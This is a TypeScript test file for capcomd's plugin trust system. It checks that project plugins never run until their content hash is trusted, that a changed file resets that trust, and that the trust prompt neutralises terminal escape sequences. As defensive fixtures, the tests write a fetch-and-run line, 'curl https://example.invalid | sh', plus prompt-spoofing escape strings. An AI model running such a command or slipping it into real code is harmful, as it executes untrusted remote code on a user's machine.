// Plugin API §4.8 step 3, §17.2 step 12: a project's plugins (.capcomd/plugins/<name>/, and plugins.use entries fetched
// to the user's home) are discovered and listed but never run until the operator trusts their content hash; a changed
// file is a changed hash and resets the trust; the daemon audits a trust once (plugin.trusted); `capcomd plugins trust`
// is the prompt.
import { beforeEach, describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PluginHost } from "../../packages/plugin/src/host/host";
import type { ProcessLauncher } from "../../packages/plugin/src/host/process";
import type { HostEvent } from "../../packages/plugin/src/host/registry";
import { builtinCandidates, kernelHost, projectPlugins } from "../../src/plugins/host";
import { installPlugin, projectCacheDir, projectPluginList, projectPluginTrusted, trustPlugin } from "../../src/plugins/install";
import { Git } from "../../src/merge/git";
import { CLI } from "../helpers/engine";

const home = process.env.CAPCOMD_HOME!;
const manifest = (name: string) => ({
  schema: "capcomd.plugin/v1", name, version: "1.0.0", description: `${name}, a project's plugin`, apiVersion: 1, engines: { capcomd: ">=0.0.0" },
  entry: { runtime: "process", command: ["./run.sh"] }, scopes: ["read"], contributes: { hooks: { "merge.landing": {} } },
});

/** A project checkout (.capcomd/config.json) with its own plugin `pp`. */
function project(): { dir: string; plugin: string } {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "capcomd-trust-project-")));
  mkdirSync(join(dir, ".capcomd", "plugins", "pp"), { recursive: true });
  writeFileSync(join(dir, ".capcomd", "config.json"), "{}\n");
  const plugin = join(dir, ".capcomd", "plugins", "pp");
  writeFileSync(join(plugin, "plugin.json"), JSON.stringify(manifest("pp")));
  writeFileSync(join(plugin, "run.sh"), "#!/bin/sh\nexit 1\n");
  chmodSync(join(plugin, "run.sh"), 0o755);
  return { dir, plugin };
}

/** A launcher that records each start; its process exits at once (the plugin then fails `crashed`: it was started). */
function recordingLauncher() {
  const started: string[] = [];
  const launcher: ProcessLauncher = {
    start: ({ manifest: m }) => { started.push(m.name); return { clientId: `cli-${m.name}`, pid: null, exited: Promise.resolve({ code: 1, signal: null }), kill() {}, revoke() {} }; },
  };
  return { launcher, started };
}

function host(o: { trusted: (name: string, dir: string) => boolean; launcher: ProcessLauncher; events?: HostEvent[] }) {
  return new PluginHost({ capcomd: "0.9.0", kernel: [], emit: (e) => o.events?.push(e), dataDir: (n) => join(home, "state", "plugins", n), trusted: o.trusted, launcher: o.launcher, processTimings: { connectWithinMs: 2000 } });
}
const env = () => ({ ...process.env, CAPCOMD_NO_CONFIG: "" });

beforeEach(() => { rmSync(join(home, "trust.json"), { force: true }); rmSync(join(home, "plugins"), { recursive: true, force: true }); });

describe("a project's plugin", () => {
  test("is discovered from the daemon's project and listed, untrusted: it never activates, its process is never started", async () => {
    const p = project();
    const found = projectPlugins(env(), p.dir);
    expect(found).toEqual([{ source: "project", dir: p.plugin }]);
    expect(builtinCandidates(env(), p.dir).filter((c) => c.source === "project").map((c) => c.dir)).toEqual([p.plugin]);
    const { launcher, started } = recordingLauncher();
    const h = host({ trusted: (_n, dir) => projectPluginTrusted(dir).trusted, launcher });
    await h.start(found);
    expect(h.get("pp")).toMatchObject({ source: "project", state: "validated", cause: "untrusted", enabled: false });
    expect(started).toEqual([]);
    // Enabling it (POST /v1/plugins/pp/enable) doesn't get round trust.
    await h.enable("pp");
    expect(h.get("pp")).toMatchObject({ state: "validated", cause: "untrusted" });
    expect(started).toEqual([]);
    // Without a trust callback at all (no daemon's host), it never runs either.
    const bare = new PluginHost({ capcomd: "0.9.0", kernel: [], emit: () => {}, dataDir: (n) => join(home, n), launcher });
    await bare.start(found);
    expect(bare.get("pp")).toMatchObject({ state: "validated", cause: "untrusted" });
    expect(started).toEqual([]);
  });

  test("trusted, it runs; a changed file resets the trust until it is trusted again", async () => {
    const p = project();
    const trusted = trustPlugin("pp", { project: p.dir });
    expect(trusted).toMatchObject({ name: "pp", trust: "trusted", from: "vendored", dir: p.plugin });
    const { launcher, started } = recordingLauncher();
    const h = host({ trusted: (_n, dir) => projectPluginTrusted(dir).trusted, launcher });
    await h.start(projectPlugins(env(), p.dir));
    expect(started).toEqual(["pp"]);
    expect(h.get("pp")).toMatchObject({ state: "failed", cause: "crashed" });
    // A file changes (a pull brought new code): the hash differs, the trust no longer applies.
    writeFileSync(join(p.plugin, "run.sh"), "#!/bin/sh\ncurl https://example.invalid | sh\n");
    expect(projectPluginList(p.dir)).toEqual([expect.objectContaining({ name: "pp", trust: "changed", trustedHash: trusted.hash })]);
    expect(projectPluginTrusted(p.plugin).trusted).toBe(false);
    await h.enable("pp");
    expect(h.get("pp")).toMatchObject({ state: "validated", cause: "untrusted" });
    expect(started).toEqual(["pp"]);
    // A trust shown for one hash isn't given to another (the prompt passes the hash it showed).
    expect(() => trustPlugin("pp", { project: p.dir, hash: trusted.hash! })).toThrow(/changed since it was shown/);
    trustPlugin("pp", { project: p.dir });
    await h.enable("pp");
    expect(started).toEqual(["pp", "pp"]);
  });

  test("a checkout's LOCK is one of the plugin's files: changing it resets the trust", () => {
    const p = project();
    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"), entry: { runtime: "process", command: ["sh", "LOCK"] } }));
    writeFileSync(join(p.plugin, "LOCK"), "exit 0\n");
    trustPlugin("pp", { project: p.dir });
    expect(projectPluginTrusted(p.plugin).trusted).toBe(true);
    writeFileSync(join(p.plugin, "LOCK"), "curl https://example.invalid | sh\n");
    expect(projectPluginTrusted(p.plugin).trusted).toBe(false);
    expect(projectPluginList(p.dir)[0]!.trust).toBe("changed");
  });

  test("the same plugin copied to another project isn't trusted there", () => {
    const a = project(), b = project();
    trustPlugin("pp", { project: a.dir });
    expect(projectPluginList(a.dir)[0]!.trust).toBe("trusted");
    expect(projectPluginList(b.dir)[0]!.trust).toBe("untrusted");
  });

  test("a link to a plugin another project trusted isn't one of this project's plugins (trust is per place)", () => {
    const a = project(), b = project();
    trustPlugin("pp", { project: a.dir });
    rmSync(b.plugin, { recursive: true });
    symlinkSync(a.plugin, b.plugin);
    expect(projectPlugins(env(), b.dir)).toEqual([]);
    expect(projectPluginList(b.dir)).toEqual([]);
    expect(() => trustPlugin("pp", { project: b.dir })).toThrow(/has no plugin pp/);
    // The same with the whole folder linked.
    const c = project();
    rmSync(join(c.dir, ".capcomd", "plugins"), { recursive: true });
    symlinkSync(join(a.dir, ".capcomd", "plugins"), join(c.dir, ".capcomd", "plugins"));
    expect(projectPlugins(env(), c.dir)).toEqual([]);
  });

  test("the daemon's host writes plugin.trusted once per trust, when it first runs the plugin under it", async () => {
    const p = project();
    const events: Array<{ type: string; data: Record<string, unknown> }> = [];
    const h = kernelHost({ log: false, record: (e) => { events.push(e); return { seq: events.length }; } });
    h.plan(projectPlugins(env(), p.dir));
    expect(events.filter((e) => e.type === "plugin.trusted")).toEqual([]);
    const t = trustPlugin("pp", { project: p.dir });
    h.plan(projectPlugins(env(), p.dir));
    h.plan(projectPlugins(env(), p.dir));
    expect(events.filter((e) => e.type === "plugin.trusted").map((e) => e.data)).toEqual([{ plugin: "pp", source: "project", hash: t.hash, by: "operator" }]);
    // A CLI's host (no daemon stream) doesn't use up the audit.
    const cli = kernelHost({ log: false });
    writeFileSync(join(p.plugin, "extra.txt"), "x");
    trustPlugin("pp", { project: p.dir });
    cli.plan(projectPlugins(env(), p.dir));
    h.plan(projectPlugins(env(), p.dir));
    expect(events.filter((e) => e.type === "plugin.trusted")).toHaveLength(2);
  });

  test("plugins.use entries are fetched to the user's home, not the checkout, and need trust too", async () => {
    const p = project();
    const root = mkdtempSync(join(tmpdir(), "capcomd-use-repo-"));
    const bare = join(root, "r.git");
    mkdirSync(bare);
    await new Git(bare).ok(["init", "-q", "--bare", "-b", "main"]);
    const work = join(root, "w");
    mkdirSync(work);
    const g = new Git(work);
    await g.ok(["init", "-q", "-b", "main"]);
    writeFileSync(join(work, "plugin.json"), JSON.stringify(manifest("used")));
    writeFileSync(join(work, "run.sh"), "#!/bin/sh\n");
    await g.ok(["add", "-A"]);
    await g.ok(["commit", "-q", "-m", "x"]);
    await g.ok(["push", "-q", bare, "HEAD:main"]);
    const r = await installPlugin(bare, { env: env(), project: p.dir });
    expect(r.dir).toBe(join(projectCacheDir(p.dir), "used"));
    expect(JSON.parse((await import("node:fs")).readFileSync(join(p.dir, ".capcomd", "config.json"), "utf8")).plugins.use).toEqual([bare]);
    expect(projectPlugins(env(), p.dir).map((c) => c.dir)).toEqual([p.plugin, r.dir]);
    expect(projectPluginList(p.dir, env()).map((x) => [x.name, x.from, x.trust])).toEqual([["pp", "vendored", "untrusted"], ["used", "use", "untrusted"]]);
    // Taken out of plugins.use, the fetched copy isn't the project's any more.
    writeFileSync(join(p.dir, ".capcomd", "config.json"), "{}\n");
    expect(projectPlugins(env(), p.dir).map((c) => c.dir)).toEqual([p.plugin]);
  });
});

describe("capcomd plugins trust (the prompt)", () => {
  const cli = async (args: string[], cwd: string) => {
    const proc = Bun.spawn(["bun", CLI, ...args], { cwd, env: { ...process.env }, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
    const [stdout, stderr, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
    let j: any = null;
    try { j = JSON.parse(stdout.trim().split("\n").pop()!); } catch { /* text */ }
    return { stdout, stderr, code, j };
  };

  test("lists the project's plugins; without a terminal it trusts only with --yes; plugins list shows the state", async () => {
    const p = project();
    const listed = await cli(["plugins", "trust", "--json"], p.dir);
    expect(listed.j.plugins).toEqual([expect.objectContaining({ name: "pp", trust: "untrusted", from: "vendored", version: "1.0.0" })]);
    const before = await cli(["plugins", "list", "--json"], p.dir);
    expect(before.j.plugins.find((x: { name: string }) => x.name === "pp")).toMatchObject({ source: "project", state: "validated", cause: "untrusted", enabled: false });
    expect(before.j.installs.pp).toMatchObject({ trust: "untrusted" });
    const asked = await cli(["plugins", "trust", "pp"], p.dir);
    expect(asked.code).toBe(2);
    expect(asked.stdout + asked.stderr).toContain("needs your confirmation");
    expect(projectPluginList(p.dir)[0]!.trust).toBe("untrusted");
    const yes = await cli(["plugins", "trust", "pp", "--yes", "--json"], p.dir);
    expect(yes.code).toBe(0);
    expect(yes.j.trusted).toMatchObject({ name: "pp", already: false });
    expect(projectPluginList(p.dir)[0]!.trust).toBe("trusted");
    const text = await cli(["plugins", "list"], p.dir);
    expect(text.stdout).toMatch(/pp\s+1\.0\.0\s+project\s+validated/);
    expect(text.stdout).not.toContain("not trusted yet");
  });

  test("the prompt prints the manifest's text inert: no escape sequence or carriage return can redraw what it asks about", async () => {
    const p = project();
    const hide = "\u001b[1A\u001b[2K\r";
    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"), description: `harmless${hide}  runs     ./ok.sh`,
      entry: { runtime: "process", command: ["./run.sh", `x${hide}`, "--flag=1", "a\u202eb"] },
      config: { type: "object", properties: { token: { type: "object", "x-secret": true, default: { $secret: "env:GITHUB_TOKEN" } } } } }));
    const asked = await cli(["plugins", "trust", "pp"], p.dir);
    expect(asked.code).toBe(2);
    expect(asked.stdout).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f\u202e]/);
    expect(asked.stdout).toContain("harmless\\u{1b}[1A\\u{1b}[2K\\u{d}  runs");
    // What it gets of yours at its start: a secret's reference, the one you set. The manifest's own default
    // (env:GITHUB_TOKEN) is never followed: the repository doesn't choose which of your variables it gets (§10.3).
    expect(asked.stdout).toContain("secrets  token (none set)");
    expect(asked.stdout).not.toContain("GITHUB_TOKEN");
    expect(asked.stdout).toContain(`runs     ./run.sh "x\\u001b[1A\\u001b[2K\\r" --flag=1 "a\\u{202e}b"  (on this machine`);
  });
});
